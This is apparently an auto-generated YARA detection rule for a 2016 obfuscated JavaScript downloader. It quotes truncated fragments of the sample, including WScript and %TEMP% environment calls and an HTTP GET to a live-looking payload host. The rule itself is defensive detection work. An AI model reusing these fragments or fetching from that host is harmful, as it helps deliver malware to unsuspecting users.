rule sig_20160428_fc453e618c92d9c901d765907f26df5d {
  meta:
    description = "datamaliciousorder - file 20160428_fc453e618c92d9c901d765907f26df5d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a2b44b83bc5e0f03f73162ff46159011666bf39c56d489aea34180dce4832eb8"

  strings:
    $s1  = "function FruGtjAtuMrdOsxYfhBau(KebIeaSkoZlpLgvMrfIhz){EkfHtpMipPidMcdPlwLka[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function BrtMttMrmAibJsnEhfGbt() {return EkfHtpMipPidMcdPlwLka[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function FruGtjAtuMrdOsxYfhBau(KebIeaSkoZlpLgvMrfIhz){EkfHtpMipPidMcdPlwLka[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function BcbKdgYynXilVupUzyRma(XfxSuhSjhXadPboBjhGon, ZvlAhiFxrJbuNlwArcKof){AaiDvfZmpYxzXslDbjJos = AaiDvfZmpYxzXslDbjJos * 1; " ascii
    $s5  = "var EkfHtpMipPidMcdPlwLka = function EbcQxwYkdOckRerVthAim() {return VwmEbgHnbLylWsdQctQyr[ZlwNzrRnjTqgGvpFyoIou](\"WScript\"+\"" ascii
    $s6  = "return XfxSuhSjhXadPboBjhGon - ZvlAhiFxrJbuNlwArcKof;};" fullword ascii
    $s7  = "RwyBrmGapSnfXnvKubEcv[GmfEquIomBnnCjdJtfHyf](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var EkfHtpMipPidMcdPlwLka = function EbcQxwYkdOckRerVthAim() {return VwmEbgHnbLylWsdQctQyr[ZlwNzrRnjTqgGvpFyoIou](\"WScript\"+\"" ascii
    $s9  = "var VwmEbgHnbLylWsdQctQyr = this[\"WScript\"];" fullword ascii
    $s10 = "function BrtMttMrmAibJsnEhfGbt() {return EkfHtpMipPidMcdPlwLka[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function ZpfJkdCjoFqaLsySztJhx(){return UkgZedAfgVahJaeCumVvf + \"\";};" fullword ascii
    $s12 = "function BcbKdgYynXilVupUzyRma(XfxSuhSjhXadPboBjhGon, ZvlAhiFxrJbuNlwArcKof){AaiDvfZmpYxzXslDbjJos = AaiDvfZmpYxzXslDbjJos * 1; " ascii
    $s13 = "if (RwyBrmGapSnfXnvKubEcv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function FfrKpuJcyCmnXalYupXie() {return ((KeqKebSluYdeTyiIkuTqx == true) && (KeqKebSluYdeTyiIkuTqx == GvgClqZalWyrLigYwxNmy)) ?" ascii
    $s15 = "function FfrKpuJcyCmnXalYupXie() {return ((KeqKebSluYdeTyiIkuTqx == true) && (KeqKebSluYdeTyiIkuTqx == GvgClqZalWyrLigYwxNmy)) ?" ascii
    $s16 = "KeqKebSluYdeTyiIkuTqx = true; " fullword ascii
    $s17 = "function OrjPtzMabSujAibGogBpn(){return ZlwNzrRnjTqgGvpFyoIou;};" fullword ascii
    $s18 = "return BcbKdgYynXilVupUzyRma(1 == 1 ? GnhItdIhsRnjUgeVmpCdr : 0, 1 == 1 ? ZqfKdhVisCfhIrzOigXdx : 0);" fullword ascii
    $s19 = "var ReuTfrBceYuvUmoBosEup = false;" fullword ascii
    $s20 = "var QomSioLrfIyaPbqUeuCll = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}